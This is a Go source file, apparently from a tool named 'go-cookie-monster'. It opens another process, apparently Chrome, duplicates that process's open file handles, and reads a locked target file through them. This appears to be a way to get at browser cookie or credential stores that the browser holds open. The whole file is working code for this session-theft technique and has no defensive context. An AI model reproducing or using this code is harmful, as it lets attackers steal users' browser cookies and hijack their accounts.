package chromefile

import (
	"fmt"
	"strings"

	"go-cookie-monster/pkg/processes"

	"golang.org/x/sys/windows"
)

func getFileFromProcess(pid uint32, filePath FilePath) ([]byte, string, error) {
	hProc, err := windows.OpenProcess(PROCESS_DUP_HANDLE, false, pid)
	if err != nil {
		return nil, "", fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProc)
	//fmt.Printf("[DEBUG] Successfully opened process %d\n", pid)

	handles, err := processes.GetProcessHandles()
	if err != nil {
		return nil, "", fmt.Errorf("failed to get process handles: %v", err)
	}
	//fmt.Printf("[DEBUG] Got %d total system handles\n", len(handles))

	handleCount := 0
	fileHandleCount := 0
	pathCount := 0

	for _, handle := range handles {
		if handle.ProcessId != pid {
			continue
		}
		handleCount++
		//fmt.Printf("[DEBUG] Checking handle for PID %d (type=%d, handle=0x%x)\n",
		//    pid, handle.ObjectTypeNumber, handle.HandleValue)

		var dupHandle windows.Handle
		err := windows.DuplicateHandle(
			hProc,
			windows.Handle(handle.HandleValue),
			windows.CurrentProcess(),
			&dupHandle,
			0,
			false,
			DUPLICATE_SAME_ACCESS,
		)
		if err != nil {
			continue
		}

		fileType, err := windows.GetFileType(dupHandle)
		if err != nil || fileType != FILE_TYPE_DISK {
			windows.CloseHandle(dupHandle)
			continue
		}
		fileHandleCount++
		//fmt.Printf("[DEBUG] Found file handle\n")

		name, err := processes.GetHandlePath(dupHandle)
		if err != nil {
			windows.CloseHandle(dupHandle)
			continue
		}
		pathCount++
		//fmt.Printf("[DEBUG] Got handle path: %s\n", name)

		if !isTargetFile(name, filePath.RelativePath) {
			windows.CloseHandle(dupHandle)
			continue
		}

		//fmt.Printf("[DEBUG] Found target file: %s\n", name)

		data, err := readFileFromHandle(dupHandle)
		windows.CloseHandle(dupHandle)
		if err != nil {
			return nil, "", fmt.Errorf("failed to read file content: %v", err)
		}

		//fmt.Printf("[DEBUG] Successfully read %d bytes from file\n", len(data))
		return data, name, nil
	}

	//fmt.Printf("[DEBUG] Process summary:\n")
	//fmt.Printf("  Total handles processed: %d\n", handleCount)
	//fmt.Printf("  File handles found: %d\n", fileHandleCount)
	//fmt.Printf("  Paths retrieved: %d\n", pathCount)

	return nil, "", fmt.Errorf("no suitable handle found in process %d", pid)
}

// isTargetFile checks if the given handle path points to our target file
func isTargetFile(handlePath string, targetRelativePath string) bool {
	// Convert paths to lowercase for case-insensitive comparison
	handlePath = strings.ToLower(handlePath)
	targetRelativePath = strings.ToLower(targetRelativePath)

	// Replace backslashes with forward slashes for consistency
	handlePath = strings.ReplaceAll(handlePath, "\\", "/")
	targetRelativePath = strings.ReplaceAll(targetRelativePath, "\\", "/")

	// The handle path will include device path (\Device\HarddiskVolumeX\...)
	// We just need to check if our target path is at the end
	return strings.HasSuffix(handlePath, targetRelativePath)
}

func readFileFromHandle(handle windows.Handle) ([]byte, error) {
	// Get file info to get size
	var fi windows.ByHandleFileInformation
	err := windows.GetFileInformationByHandle(handle, &fi)
	if err != nil {
		return nil, fmt.Errorf("failed to get file information: %v", err)
	}

	// Calculate file size from high and low bits
	fileSize := int64(fi.FileSizeHigh)<<32 + int64(fi.FileSizeLow)

	// Create buffer to hold file contents
	buffer := make([]byte, fileSize)
	var bytesRead uint32

	// Set file pointer to beginning
	_, err = windows.SetFilePointer(handle, 0, nil, windows.FILE_BEGIN)
	if err != nil {
		return nil, fmt.Errorf("failed to set file pointer: %v", err)
	}

	// Read file content
	err = windows.ReadFile(handle, buffer, &bytesRead, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %v", err)
	}

	if int64(bytesRead) != fileSize {
		return nil, fmt.Errorf("incomplete read: got %d bytes, expected %d", bytesRead, fileSize)
	}

	return buffer[:bytesRead], nil
}
